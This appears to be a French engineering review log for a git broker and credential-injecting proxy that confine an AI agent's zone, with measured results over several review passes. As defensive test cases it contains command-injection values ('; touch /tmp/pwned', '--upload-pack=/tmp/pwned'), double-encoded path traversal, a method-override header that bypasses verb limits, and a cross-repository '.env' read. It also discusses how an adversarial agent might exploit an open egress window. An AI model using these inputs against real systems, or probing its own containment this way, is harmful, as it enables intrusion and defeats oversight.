| Le relais doit répondre `git-lfs-authenticate` | **Oui, et c'est la voie propre** : git-lfs appelle bien le serveur SSH, **et** il utilise le `href` renvoyé — mesuré, la requête batch est arrivée sur un listener local et non sur la forge, **sans en-tête `Authorization`** (`auth=None`), donc c'est le proxy qui l'injecte. La réponse ne contient qu'une adresse. |
| Le transfert LFS en SSH pur (`git-lfs-transfer`) | **Refusé par le relais, et git-lfs se replie seul** sur le HTTP : c'est le comportement voulu, et la porte reste à un seul verbe. |
| `blockinfile state=absent` sur un fichier absent | **Échoue** (« Path … does not exist ») : les retraits du bloc `disabled` sont gardés par un `stat`. |
| OpenSSH 10 | `PerSourcePenalties crash:90 authfail:5 min:15 max:600` **par défaut** : sur une instance dont le seul client est la VM, cinq échecs d'authentification banniraient le harnais de son propre broker → `PerSourcePenalties no`, justifié. |

**Ce que la vérification a établi** (rôles déployés sur la VM, aller-retour git et LFS réels, puis démontage) :

| Vérifié | Mesure |
|---|---|
| La session SSH tourne sous l'uid de la zone de confiance | `session opened for user git-broker(uid=994) by git-broker(uid=0)` — le démon sshd est root, c'est la seule façon de baisser les privilèges ensuite |
| Le git reste natif | `clone`, `checkout -b`, `commit`, `push` → la branche existe côté amont. **Les trois formes de l'URL** clonent : `ssh://git-broker/dépôt.git`, `git-broker:dépôt.git` et `git-broker:dépôt` |
| **LFS, de bout en bout** | `Uploading LFS objects: 100% (1/1), 500 KB` puis `PUT …/objects/<oid>` **et** `GET …/objects/<oid>` (500 000 octets) reçus par l'amont avec `auth=Basic …` **injecté** : le `Host` transmis ramène les URL de transfert sur le loopback, et le clone frais rend un fichier dont le sha256 **est** l'oid poussé |
| Refus | shell, dépôt non déclaré, et les **deux formes d'injection** (`… ; touch /tmp/pwned`, `… --upload-pack=/tmp/pwned`) refusés, **une ligne par refus** dans le journal, et aucune commande exécutée |
| **La porte HTTP est bornée** | `GET` sur le dépôt déclaré → 200 ; `POST …/pulls` → 200 ; `DELETE …/<dépôt>` et `POST …/hooks` → **403 sans jamais atteindre l'amont** (journal de la forge) ; `/api/v1/user/keys` et un autre dépôt → **404**. Postérieur à cette passe : `PATCH` admis sur la proposition, emplacements **bornés** (chemin exact + sous-arbre), chemin échappé refusé, `X-HTTP-Method-Override` vidé — forme **rendue puis validée par `nginx -t`**, pas redéployée |
| Aucun credential côté agent | clé de déploiement, bloc d'injection et clé d'hôte illisibles ; seuls `authorized_keys` et `config` subsistent dans son `.ssh` |
| Fail-closed | broker arrêté → le git de l'agent échoue ; redémarré → les références |
| Conteneur | `{"login": "agent-sre"}` depuis un conteneur, avec **et** sans `--network=host` (le `netns=host` global rend le second inutile) |
| Idempotence | `changed=3`, les trois tâches préexistantes (lever du filtre, `nvm` npm, réapplication du ruleset) — **aucune** du broker |
| Démontage | unités, utilisateur, arborescences, clé factice, `known_hosts` et les deux blocs balisés retirés ; `nginx` laissé masqué ; socle intact (`8001` seul écouteur, broker Kubernetes actif) |
| Redémarrage | unités actives, écouteurs en place, filtre d'egress **chargé**, `ls-remote` et sonde d'API OK, shell toujours refusé |

**Vérification sur la forge réelle** (Forgejo derrière Traefik, CA interne, compte dédié, premier déploiement) :

| Vérifié | Mesure |
|---|---|
| Le transport, sous l'uid du harnais | `clone` OK, branche poussée, et la forge propose sa PR ; `ls-remote` déjà assuré par le contrôle d'effet du rôle |
| **La protection de branche tient** | `git push origin HEAD:refs/heads/main` → `remote: Forgejo: Not allowed to push to protected branch main` puis `! [remote rejected] HEAD -> main (pre-receive hook declined)`. C'est *la* propriété du design, et elle est mesurée sur la forge |
| **LFS de bout en bout, sur la forge réelle** | objet de 1 Mio : le blob dans le dépôt est un **pointeur** (`version https://git-lfs.github.com/spec/v1`), un clone frais rend **1 048 576 octets** et un **sha256 identique** ; le journal du proxy porte `objects/batch`, le `PUT …/objects/<oid>/1048576` et le `GET` du clone. La réécriture du **nom de la forge** (celle jamais mesurée) porte donc bien le transfert |
| La porte HTTP | sonde `GET /api/v1/repos/<dépôt>` → **200** ; `DELETE` le dépôt → **403** ; `/api/v1/user/keys` → **404** ; un nom qui allonge le dépôt déclaré → **404** ; chemin doublement encodé → **403** |
| Les refus du relais | shell et dépôt non déclaré → `git-broker: refused`, **15 refus** journalisés |
| La zone agent n'a aucun chemin direct | HTTPS direct → échec ; 2222 direct → bloqué. Les deux seules portes sont `127.0.0.1:2222` et `127.0.0.1:8002` |
| Les unités | `token-proxy` sous l'uid **broker**, les deux écouteurs en loopback seul, `agent-egress` actif |

**Deux constats de cette vérification.**

1. **Les tags n'étaient pas protégés, et c'était mesuré** : `git push origin HEAD:refs/tags/…` était **accepté** (la branche, elle, refusée) — le risque 7 n'était donc pas théorique, un tag poussé par l'agent pouvait déclencher un pipeline de déploiement. **Fermé côté forge et re-mesuré** : le déploiement a restreint les tags à son compte, et la même poussée rend désormais `remote: Forgejo: Tag agent-sre-test is protected` puis `! [remote rejected] … (pre-receive hook declined)`, `main` restant refusé de la même façon.
2. **Un 403 transitoire de la forge sur `locks/verify`**, au premier `git push` LFS : git-lfs abandonne (fail-closed, rien de partiel), et le même appel répond ensuite `200 {"ours":[],"theirs":[]}` — les deux tentatives suivantes passent. Cause la plus probable : le cache de permissions de Forgejo sur un collaborateur fraîchement ajouté. Ce n'est pas le proxy : son journal montre la requête transmise. À savoir si ça se reproduit : **réessayer**, pas chercher côté broker.

**Trois défauts, tous dans le code de cette phase, tous trouvés par la mesure** :

1. `CapabilityBoundingSet` **sans `CAP_SYS_CHROOT`** → `chroot("/run/sshd"): Operation not permitted` : la séparation de privilèges d'`sshd` ne peut pas s'établir, et la session meurt avant le relais. Toute unité `sshd` durcie a besoin de cette capacité.
2. `server_tokens` au contexte **main** de nginx → le démon refuse de démarrer : la directive n'est permise que dans `http`, `server` ou `location`.
3. **`index_var` d'Ansible est 0-based** quand `loop.index` de Jinja est 1-based : la configuration incluait `1.conf`/`2.conf` pendant que le rôle écrivait `0.conf`/`1.conf`. Le nettoyage supprime désormais tout index hors de la plage déclarée, **dans les deux sens** (une liste qui rétrécit ne doit pas laisser un jeton derrière un index que la config n'inclut plus).

**Revue de code de cette phase : ce que la mesure a confirmé, corrigé ou écarté.**

| Constat | Mesure | Suite |
|---|---|---|
| nginx refuse de démarrer sans `proxy_ssl_trusted_certificate` dès que `proxy_ssl_verify on` | **Confirmé** : `[emerg] no proxy_ssl_trusted_certificate for proxy_ssl_verify` (nginx 1.28.3). Le premier test ne l'avait pas vu : la forge locale déclarait un `ca_src`, donc la branche fautive n'était jamais rendue. | **Corrigé** : sans `ca_src`, l'entrée pointe le faisceau système (`token_proxy_ca_bundle`) — le cas GitHub/Let's Encrypt. |
| Un jeton contenant `$` casse la configuration | **Confirmé** : `unknown "cd" variable`, nginx refuse de démarrer — et `$` **ne s'échappe pas** dans une valeur de directive. | **Corrigé** : l'assertion de la liste exige un jeton d'une ligne et sans `$` — le `"` et l'antislash sont désormais **échappés** par le template, donc admis (cf. 5e passe). |
| `CapabilityBoundingSet` bloque `pam_loginuid.so` | **Réfuté** : `/etc/pam.d/sshd` contient bien `session required pam_loginuid.so`, et 38 sessions se sont ouvertes sous l'uid du broker avec `CAP_SETUID CAP_SETGID CAP_CHOWN CAP_DAC_OVERRIDE CAP_SYS_CHROOT`. | Rien à changer : ajouter `CAP_AUDIT_CONTROL` élargirait la boîte à outils d'un démon exposé, sans cause mesurée. |
| `/run/sshd` doit exister au démarrage | **Confirmé deux fois** : systemd **ne crée pas** un `ReadWritePaths` absent (`Failed at step NAMESPACE`, `status=226`), et c'est la propre unité `ssh.service` (`RuntimeDirectory=sshd`) qui crée le répertoire — le rôle en dépendait implicitement. | **Corrigé** : le rôle crée `/run/sshd` (0755 root:root, idempotent) et le laisse en place au démontage — `RuntimeDirectory` l'aurait **supprimé** à l'arrêt, cassant les sessions *neuves* de l'administrateur. |
| Le relais ré-émet la commande brute de l'agent | **Confirmé, et c'était le trou** : `set -- $cmd` ne vérifiait ni le nombre d'arguments ni leur forme, et `exec ssh … "$cmd"` rejouait la chaîne entière. Mesuré sur la logique du relais : `git-upload-pack '/dépôt' ; touch /tmp/pwned` et `… --upload-pack=/tmp/pwned` étaient **acceptés** puis transmis. | **Corrigé** : nombre d'arguments exact par verbe, `set -f`, et la commande est **reconstruite** depuis le dépôt canonique retenu. Vérifié de bout en bout. |
| Le relais refuse la syntaxe `scp` | **Confirmé** : `git clone git-broker:dépôt` (sans slash, ou sans `.git`) était refusé — un piège pour un agent qui écrit l'URL naturelle. | **Corrigé** par le même changement : le chemin est normalisé avant comparaison, l'amont reçoit la forme canonique. |
| L'API HTTP est ouverte à tout le compte | **Confirmé par construction** : le PAT porte l'autorité du compte (Forgejo n'a pas de jeton scopé à un dépôt), donc `DELETE /api/v1/repos/<le mien>` détruisait le dépôt et `POST …/hooks` ouvrait une exfiltration permanente. | **Corrigé** : les chemins routés sont **dérivés des dépôts déclarés** et les verbes bornés (`git_broker_api_read_methods` / `_proposal_methods`). Mesuré : 403 pour `DELETE` et `…/hooks`, jamais vus par l'amont. |
| `Host: $http_host` casse une forge à hôte virtuel | **Confirmé sur la forge réelle** : elle est derrière **Traefik**, qui ne répond qu'au nom — l'entrée LFS transmettait donc un `Host` que le frontal ne route pas. | **Corrigé** : les deux entrées HTTP présentent le nom de l'amont. Les liens d'objet arrivent alors avec ce nom, et la liste de réécriture les ramène au proxy (mécanisme mesuré ; la forme « forge servie en direct » reste couverte par la même liste). |
| GitHub sert LFS ailleurs que son API | **Confirmé** : `api.github.com` n'est pas `github.com`. | **Corrigé** : `git_broker_lfs_upstream` (défaut : l'amont d'API). |
| La réécriture LFS ne couvre pas l'hôte demandé | **Confirmé, et c'est ce qui faisait échouer le *pull*** : la forge construisant ses liens depuis l'hôte de la requête, ils arrivent en `https://127.0.0.1:8002/…` alors que la liste ne réécrivait que `https://<forge>/`. La poussée passait, le clone retombait sur du TLS. | **Corrigé** : les trois bases possibles (alias, nom de la forge, endpoint loopback **avec son port**) sont réécrites dans une seule section `[url]`. Vérifié : aller-retour complet, sha identiques. |
| `token_proxy` absent de `trust_zone_dependent_units` | **Confirmé** : il tourne sous l'uid **partagé** de la zone de confiance — `userdel` échouerait si les deux rôles étaient désactivés dans le même play. | **Corrigé** : ajouté à la liste (le broker git a son propre uid : rien à y faire). |
| LFS vers un stockage objet (S3/MinIO) est hors d'atteinte | **Confirmé** : les URL pré-signées pointent ailleurs, et le filtre d'egress de la zone agent ne laisse que le loopback. | **Écarté** comme correctif : ce n'est pas le broker mais l'egress — la composition est de déclarer le stockage dans `agent_egress_proxy_allowlist` (README). |

Écarté faute de risque établi : **filtrer `GIT_PROTOCOL`** — la valeur est interprétée par le git de la forge, une valeur malformée ne dégrade que la session de l'agent (et la CVE citée à l'appui concerne les sous-modules, pas cette variable).

**Deuxième passe de revue : ce que la mesure a confirmé, corrigé ou écarté.** (Bancs nginx locaux sur la VM : correspondance d'emplacement, URI brute contre normalisée, cgroup ; rendu des entrées réelles puis `nginx -t`.)

| Constat | Mesure | Suite |
|---|---|---|
| `location /api/v1/repos/<dépôt>` : un préfixe **nu** route aussi tout dépôt dont le nom *commence* par celui-ci | **Confirmé — et c'est une fuite de lecture inter-dépôts** : banc, `GET /api/v1/repos/owner/repo-backend/contents/.env` → **200**, servi par l'emplacement de `owner/repo`. La mesure du tableau précédent (« un autre dépôt → 404 ») portait sur un nom **sans préfixe commun** : elle ne couvrait pas ce cas. | **Corrigé** : chaque chemin déclaré est émis **exact** (`location = <chemin>`, la forme que la sonde appelle) **et** en sous-arbre (`location <chemin>/`). Banc : la forme nue laisse passer, la forme bornée rend **404** sur le nom étendu, 200 sur le chemin exact et sur son sous-arbre, et **404** sur `%2D` (nginx décode avant de choisir l'emplacement). L'entrée LFS, déjà terminée par `/`, était indemne. |
| La décision porte sur l'URI **normalisée**, l'URI **brute** part vers l'amont | **Confirmé** : banc, `GET /e/api/%252e%252e%252fadmin` arrive à l'amont **tel quel**, alors que l'emplacement a été choisi sur la forme normale — une chaîne autorisée peut donc en dire une autre chez un amont qui décode deux fois. | **Corrigé, mais pas par le correctif proposé** (voir la ligne suivante) : un `map` sur `$request_uri` refuse (**403**) les échappements qui peuvent dire autre chose à l'amont, dans ces emplacements. Mesuré : chemins légitimes 200, échappés 403, et une **query string** gardant son `%2C` reste admise (le motif s'arrête au `?`). *(Le périmètre exact du refus a été **resserré** à la 3e passe : voir plus bas — la première version refusait **tout** `%`, ce qui fermait la moitié HTTP GitLab.)* |
| Durcir en transmettant `$uri` (`proxy_pass https://<amont>$uri$is_args$args`) | **Réfuté, et ce serait pire** : `$uri` est **décodée une fois** — banc, `GET /n/api/one%20two` **n'atteint jamais** le gestionnaire (l'espace littéral casse la ligne de requête, aucune trace côté amont), et un `%2F` deviendrait un séparateur de chemin, c'est-à-dire l'inverse d'une borne. | Écarté au profit du refus ci-dessus, plus petit (un `map` et une ligne par emplacement) et sans changer la forme transmise aux amonts. |
| Le jeton « nginx traite `` ` `` comme un échappement, même entre guillemets » | **Réfuté** : `nginx -t` accepte la configuration, et l'amont reçoit ``tok`en`` **inchangé** — comme `tok\en` et `a;b{c}d`. Les deux seuls caractères que nginx donne à une valeur de directive sont `$` (variable) et `"` (fin de valeur), **déjà** interdits par l'assertion. | Rien à resserrer : la classe proposée refuserait des jetons valides sans rien fermer de plus. |
| L'entrée de lecture `GET` est redondante avec le SSH et élargit à tout le préfixe : hooks, collaborateurs, noms des secrets CI, logs de jobs | **Confirmé** : tous ces chemins sont sous le préfixe routé, et l'agent lit déjà le **contenu** du dépôt par `git-upload-pack`. Les logs de jobs contiennent régulièrement des secrets partiellement masqués. | **Décision du déploiement : garder**, et l'inscrire comme élargissement assumé (risque 12) — le README le dit désormais au lieu de laisser croire que « rien d'autre » n'est routé. |
| Le composant qui parse des réponses de l'amont tourne sous l'uid **partagé** de la zone de confiance | **Confirmé** : c'est le seul composant joignable depuis la zone agent à partager l'uid qui détient les clés du gateway, la CA du proxy L7 et le jeton SA du cluster. Le broker git, lui, a le sien. | **Décision du déploiement : garder l'uid partagé** — le broker git a son propre compte *parce qu'il a besoin de son script comme shell*, pas par règle générale. Compensation : le `ReadWritePaths` du proxy ne contient plus que son répertoire d'exécution, l'uid partagé ne lui donne donc plus l'écriture dans le home commun. |
| `MemoryMax=64M` bornerait une session relayée au point de casser un clone volumineux | **Réfuté** : banc, 1 Gio (8192 × 128 Kio) traversés dans un cgroup `MemoryMax=64M` → **pic 6,8 Mio**, `Result=success`. Un flux ne s'accumule pas : la borne est un plafond de **concurrence**, pas de taille. | Rien à changer, la valeur reste — désormais avec la mesure. `MaxSessions` vaut 10 **par connexion** (mesuré) : l'ajouter ne bornerait pas un agent qui ouvre plusieurs connexions, donc n'apporterait rien. |
| Le journal d'accès n'a pas de rotation, et c'est l'agent qui pilote le volume | **Confirmé** — et ce fichier était le seul du dépôt : partout ailleurs la trace va au journal, borné par journald. | **Corrigé** : `access_log syslog:` → journal de l'unité (**mesuré** sous les directives de bac à sable du rôle : la ligne atterrit dans `journalctl -u token-proxy`). Le répertoire de logs, sa tâche et son entrée `ReadWritePaths` **disparaissent**. Contrepartie assumée : sous inondation journald écrête au lieu de remplir le disque. |
| Les en-têtes du client traversent tels quels | **Confirmé** : `X-HTTP-Method-Override: DELETE` envoyé par le client arrive à l'amont sous un `POST` pourtant autorisé ; avec `proxy_set_header … ""`, il est **retiré**. | **Corrigé** : l'en-tête est vidé sur chaque entrée — un verbe que l'amont pourrait honorer depuis un en-tête n'est pas le verbe que `limit_except` a admis. |
| Un amont `http://` enverrait le jeton injecté en clair | **Confirmé par lecture** : l'assertion ne portait que sur la longueur, et `proxy_ssl_verify on` serait devenu un no-op silencieux. | **Corrigé** : l'assertion exige `https://`. |
| `git_broker_user: root` (ou le compte d'administration) passe l'assertion | **Confirmé** : le motif `^[a-z0-9-]+$` l'accepte, puis la tâche `user` remplace son shell par le relais et son home par celui du broker — lockout sans console, la panne pour laquelle le README a une section dédiée. | **Corrigé** : `root` et `ansible_user` sont exclus, le motif est rappelé dans le message. |
| `git_broker_repos` n'est validé ni en forme ni en unicité | **Confirmé** : un espace ou une apostrophe casse le `join(' ')` du relais et le quoting de la commande amont ; et deux entrées qui normalisent vers le même chemin produisent **deux fois le même `location`** — banc : `[emerg] duplicate location "/a/b"`, nginx refuse de démarrer, donc le proxy **entier** tombe. | **Corrigé** : assertion de forme (`[A-Za-z0-9._/-]`) et d'unicité après normalisation (`/` de tête et `.git` retirés), avec les deux effets dans le message. |
| Le test « le shell est refusé » passe pour **n'importe quel** échec (`failed_when: rc == 0`) | **Confirmé** : une pénalité d'authentification ou une connexion refusée aurait suffi à « prouver » la propriété. | **Corrigé** : le test exige `refused` dans la sortie d'erreur — le refus doit être **celui du relais**, pas celui de sshd. |
| Les bases de réécriture LFS se déduisent de l'hôte **SSH** | **Confirmé** : les liens portent le nom **HTTP**, celui que le proxy présente. Dès que les deux diffèrent (`ssh.github.com`, un nom git-ssh dédié), aucune base ne matchait — LFS cassé, mais fail-closed. | **Corrigé** : la base utile est dérivée de `git_broker_lfs_upstream` (`urlsplit('netloc')`, donc le nom **et** le port que `$proxy_host` présente), plus `git_broker_lfs_rewrite_extra` pour une forge dont le nom public est un troisième ; l'alias et l'endpoint loopback restent. |
| Un push peut faire exécuter du CI côté forge | **Confirmé par construction** : une branche neuve n'est pas protégée, donc un `.forgejo/workflows/` modifié y fait tourner un runner — machine hors de la zone agent, avec son propre egress et souvent les secrets du dépôt. | **Inscrit côté forge** (README, « On the forge ») : protéger les chemins de workflow comme `main`, ou tenir les secrets hors des runs qu'un acteur non listé peut déclencher. C'est la voie d'escalade du verbe push, et elle appartient à la forge. |

**Troisième passe de revue.** (Banc nginx : la porte GitLab encodée, le garde resserré, les cas de forme des dépôts.)

| Constat | Mesure | Suite |
|---|---|---|
| **Le refus de tout `%` ferme la moitié HTTP GitLab**, que le README et l'exemple documentent | **Confirmé, et c'était une régression de la 2e passe** : GitLab exige le chemin encodé sur un segment (`NAMESPACE/PROJECT_PATH`, `/` en `%2F`). Sous le refus global, `/api/v4/projects/group%2Fproject` → **403**, et la même requête non encodée → **404** chez GitLab : les deux portes fermées. | **Corrigé** : le `map` ne refuse plus que `%(2e\|25)`, donc `%2F` repasse. Banc : `/api/v4/projects/group%2Fproject`, son sous-arbre et sa query → **200**, l'amont recevant la forme **encodée** qu'il attend ; `%252e%252e%252f` → **403** ; `%2e%2e` → **404** (nginx résout la traversée **avant** de choisir l'emplacement, la clause `%2e` est donc une ceinture qui ne coûte rien : aucun chemin légitime n'encode un point) ; le dépôt dont le nom allonge reste **404**. README et commentaire du template disent maintenant **la même chose**, `%2F` nommé. |
| L'assertion d'unicité rate le **slash final**, et c'est le cas qui tue nginx | **Confirmé** : `["owner/repo", "owner/repo/"]` passait pour deux noms distincts, mais produisait **deux fois** `location /api/v1/repos/owner/repo/` — la forme sous-arbre du premier, la forme préfixe du second — soit exactement la panne que l'assertion prétend empêcher. | **Corrigé des deux côtés** : `/` final rejeté par le test de forme (il donne aussi `/owner/repo/.git` au relais, qui ne matche aucun dépôt) **et** `/+$` ajouté à la chaîne de déduplication, pour que l'assertion soit correcte en elle-même. Les six cas de banc repassent. |
| Le nouveau visage HTTP n'avait jamais été déployé de bout en bout | **C'était exact au moment de la 3e passe** : borne, garde d'échappement et `X-HTTP-Method-Override` validés par banc et par `nginx -t` sur le fichier rendu seulement. | **Fait et mesuré sur la forge réelle le 19/09** (voir le tableau de vérification ci-dessus) : `ls-remote`, clone/push, **aller-retour LFS complet** avec objet de 1 Mio, sonde 200, `DELETE` 403, frère par préfixe 404, `%252e` 403, refus du shell. L'effet du garde `%` sur LFS n'est donc plus du raisonnement : les chemins LFS ne portent ni `%2e` ni `%25`, et le transfert est passé. |

**Quatrième passe de revue.** Un seul constat, et c'est une lacune de **documentation**, pas de code : le garde resserré rouvre GitLab pour l'agent, mais pas pour le **contrôle d'effet** du rôle. La sonde est dérivée de `git_broker_api_read_locations[0]`, que le commentaire fait déclarer en forme **décodée** — or la sonde est une **requête**, là où un emplacement est un **motif** : GitLab répond 404 sur la forme non encodée (« `NAMESPACE/PROJECT_PATH` … `/` is represented by `%2F` »), donc sur un déploiement GitLab correct le play s'arrêtait sur « Assert that the injected credential is accepted », avec un message envoyant chercher du côté du jeton ou de l'amont.

| Constat | Mesure | Suite |
|---|---|---|
| La sonde dérivée n'est pas la bonne **forme** sur une forge qui encode ses chemins | **Confirmé par lecture** (le message, lui, était le vrai défaut : il accusait le jeton). Le remède existait — l'override `git_broker_api_probe` est juste au-dessus — mais rien ne disait lequel écrire. | **Documenté** : README et `group_vars` disent maintenant la distinction (la sonde porte ce que l'emplacement normalise) avec les deux formes GitLab côte à côte, et le message d'échec cite la forme de la sonde parmi les causes. Même phrase : `/merge_requests` au lieu de `/pulls` pour les propositions — là, pas d'assertion trompée, le `POST` rend un 404 visible (fail-closed). La branche GitLab reste **non mesurée sur une instance réelle** : banc et rendu seulement, comme le reste de la matrice. |

**Cinquième passe de revue.** Quatre constats, tous dans le **template d'injection** : trois confirmés — deux par la mesure, dont un plus grave que décrit — et un réfuté dans son mécanisme.

| Constat | Mesure | Suite |
|---|---|---|
| Le remplacement en chaîne `replace('TOKEN_B64', …) \| replace('TOKEN', …)` : le second s'applique à la **sortie** du premier, et `TOKEN` est un fragment base64 valide | **Confirmé, et reproduit dans l'artefact** : avec un jeton construit pour que son base64 le contienne (`YWdlbnQtc3JlOmFhTOKENA==`), l'en-tête rendu devient `Basic YWdlbnQtc3JlOmFhaaL…4A==` — base64 corrompu, donc LFS en 401. Fenêtre minuscule sur un vrai jeton (≈3·10⁻⁸), mais le défaut est réel et **silencieux**. | **Corrigé** : chaque forme est construite depuis l'en-tête **déclaré**, jamais depuis la sortie de l'autre. Rendu : base64 **intact**. |
| Un **chemin** dans l'amont (un simple slash final suffit) | **Confirmé, et plus grave que « tout part en 404 »** : banc, l'emplacement déclaré `…/owner/repo/` avec un amont suffixé d'un slash transmet `/api/v1/user/keys` pour une requête `…/owner/repo/api/v1/user/keys` — l'agent atteint **l'API du compte** avec le jeton injecté. Ce n'est pas une casse mais un **contournement du bornage** : `location` décide *si*, l'amont décide *quoi*. | **Corrigé** : l'assertion exige une **origine nue** (`^https://[^/\s]+$`) — chemin, espace final et `http://` refusés ; les chemins se déclarent dans les emplacements, et le message le dit. Banc des huit formes. |
| L'antislash du jeton, « car `\123` serait interprété » | **Mécanisme réfuté, danger confirmé** : banc, `\123`, `\q` et `\e` ressortent **inchangés** — mais `\n` **tronque la valeur** (`a\nb` arrive en `a`, l'en-tête s'arrête là), `\t` insère une tabulation, et `\"`/`\\` sont bien des échappements. Un jeton portant `\n` en texte était donc mutilé en silence. | **Corrigé autrement que proposé** : plutôt que d'interdire l'antislash (ce qui refuserait un jeton légitime), le template **échappe** `\` et `"`. Mesuré de bout en bout : jeton `abc\ndef`, l'amont reçoit `'token abc\ndef'` **entier**. L'assertion ne refuse plus que ce que nginx ne sait pas échapper — `$` et les espaces. |
| L'endpoint LFS **nu** (`…/info/lfs`, sans slash) tombe en 404 | **Confirmé, et c'est une incohérence interne** : c'est **exactement l'URL que le relais annonce** en réponse à `git-lfs-authenticate`, et l'ensemble routé ne la contenait pas. | **Corrigé** : la localisation déclarée perd son slash final, donc le template émet les **deux** formes — `= …/info/lfs` et `…/info/lfs/` : le sous-chemin `objects/batch` reste servi et l'URL annoncée répond (mesuré, 200). |

**Sixième passe de revue** (deux relectures indépendantes, dont une avec fuzz du relais sur 44 cas et relecture du décodeur de nginx dans son source : aucun défaut de sécurité trouvé dans les deux rôles). Trois correctifs, un mesuré.

| Constat | Mesure | Suite |
|---|---|---|
| **La fenêtre du filtre d'egress** — le seul vrai reste opérationnel, désigné n°1 par la revue | Le play **détruit** la table en pré-tâche et seul le **dernier** rôle la rétablit : tout échec entre les deux laissait la zone agent ouverte, indéfiniment — et le diff ajoute des points d'échec après la levée. Les pré-vols réduisent la probabilité, pas la classe. | **Tenté, mesuré, retiré.** Un handler de play avec `force_handlers: true`, notifié par la levée, *marche* sur l'échec (mesuré : échec provoqué → la table est revenue) mais **casse le chemin nominal** : six rôles font `flush_handlers` en cours de play (agent_egress_proxy, git_broker, inference_gateway, k8s_broker, ollama, token_proxy) et le premier d'entre eux déclenche le handler au milieu du socle — le filtre revient avant que `nvm`/`npm`, qui tournent sous l'uid du harnais, aient fini. Mesuré : le play échoue à `nvm install lts/*`, `Version '' (with LTS filter) not found` en 0,15 s (rejet immédiat, donc filtre déjà remis). Second fait mesuré : **un second play ne tourne pas** après l'échec du premier, donc pas de play de nettoyage non plus. **Handlers et second play écartés ; le play est revenu à son état vérifié.** La réponse retenue est **côté harnais** (Phase 8) : arrêter l'agent — son unité *et* ce qu'il a lancé — **avant** la levée du filtre. Elle ne réduit pas la fenêtre, elle en retire l'exploitant (un agent antagoniste peut guetter une porte ouverte, pas s'en servir arrêté), et elle renverse le mode d'échec : un play interrompu laisse l'agent **arrêté** jusqu'au prochain run au lieu d'un agent **non filtré**. Un déplacement de la levée dans le rôle `nvm` (seul rôle à sortir sous l'uid du harnais — mesuré : `developer_config` non, `apt`/`ollama`/`litellm` non plus puisque le filtre ne couvre que l'uid du harnais et ses subordonnés) a été écarté : contrat par rôle à retenir, et la levée du play redeviendra nécessaire pour les mises à jour. |
| `basic_user` non asserté pour `TOKEN_B64` | Rendu mesuré : un `basic_user` vide produit `Basic base64(":jeton")` — un 401 LFS **à l'usage**, sans sonde pour l'attraper (l'entrée LFS n'en a pas). | **Corrigé** : l'assertion de la liste exige le nom du compte dès que l'en-tête porte `TOKEN_B64`, avec le motif dans le message. |
| Un `Authorization` du client traverse quand l'entrée déclare un autre en-tête | GitLab **priorise** `Authorization` sur le `PRIVATE-TOKEN` qu'on lui injecte : un `Authorization: Bearer <placeholder>` envoyé par l'agent ferait 401, l'en-tête injecté étant ignoré. | **Corrigé** : quand l'entrée ne déclare pas `Authorization`, il est **vidé** (`proxy_set_header Authorization ""`). Rendu vérifié dans les deux sens : avec `PRIVATE-TOKEN` déclaré, la ligne de vidage apparaît ; avec l'en-tête Forgejo par défaut, **aucune** ligne de vidage (le déploiement réel est inchangé), et `nginx -t` passe sur la forme GitLab. |

Notes sans action : le filtre de méthode **tient pour une API JSON** (le merge GitHub en `PUT` est refusé), mais une forge Rails accepte aussi `_method` en **paramètre de formulaire**, que le vidage d'en-tête ne couvre pas — à traiter côté GitLab seulement, en restreignant le `Content-Type` du `POST` ou en assumant ; la clause `%2e` du garde est une ceinture redondante (nginx résout `..` avant de choisir l'emplacement) ; `PerSourcePenalties no` exige OpenSSH ≥ 9.8 (l'image 26.04 est en 10.x — à revérifier si l'image change) ; un dépôt déclaré `repo.git2` voyage sous `repo.git2.git`, cohérent de bout en bout mais uniquement parce que la forge retire le suffixe une seconde fois.

**Préparation du déploiement (à la demande du déploiement).** Trois ajouts, tous côté outillage.

- **La clé de déploiement se crée elle-même.** Si `git_broker_ssh_key_src` est absent, le play la génère sur le poste de contrôle, dit quoi enregistrer — et **s'arrête** (`meta: end_play`, dont le `when` est honoré : mesuré). Sans cet arrêt, le premier run aurait échoué au `ls-remote` du rôle, c'est-à-dire **après** la levée du filtre d'egress : la zone agent serait restée ouverte. Mesuré : `ok=9 changed=1 failed=0`, clé et moitié publique en 0600, filtre **toujours chargé**, rien de modifié sur la VM.
- **Convention des deux dossiers, posée par le déploiement : `files/` reçoit ce qu'il dépose** (le jeton, la CA, le kubeconfig), **`output/` ce que le play produit** (la clé générée et sa moitié publique). La clé n'est donc pas dans `files/` : elle est écrite sous `output/` — deux dossiers gitignorés, aucun secret suivi. `git_broker_token_src` garde son défaut sous `files/`, parce qu'un jeton est un dépôt de l'utilisateur : le play ne peut pas le créer.
- **Les deux chemins de secrets ont un défaut** là où le kubeconfig du broker Kubernetes n'en a pas : la différence est assumée — une clé, le play peut la *créer*, un kubeconfig non. Sans défaut, la génération n'avait nulle part où écrire (mesuré à la première tentative : `ssh-keygen` recevait `-f` sans argument, parce que le défaut du rôle était la chaîne vide).
- **La procédure du jeton est écrite** au README : compte **dédié** (jamais le compte d'administration, dont le jeton hériterait de toute l'autorité), collaborateur *Write* sur le seul dépôt, jeton *Specific repositories* avec `write:repository` (+ `write:issue` si les issues sont ouvertes), avec expiration. Et pour LFS : rien de plus à faire côté forge une fois activé — le client est déjà dans la zone agent par le socle (`essential_packages`).

Reste ouvert : une clé **déjà présente mais non enregistrée** sur la forge fait échouer le run au `ls-remote`, donc après la levée du filtre — même classe que le `block`/`rescue` proposé plus haut, toujours pas fait. Reste ouvert aussi : si un amont traitait `\` comme séparateur de chemin, il faudrait ajouter `5c` au refus d'échappement. Aucun des trois (Forgejo, GitLab, GitHub) ne le fait — le `map` refuse donc ce qui est **mesuré**, pas ce qui est imaginé.

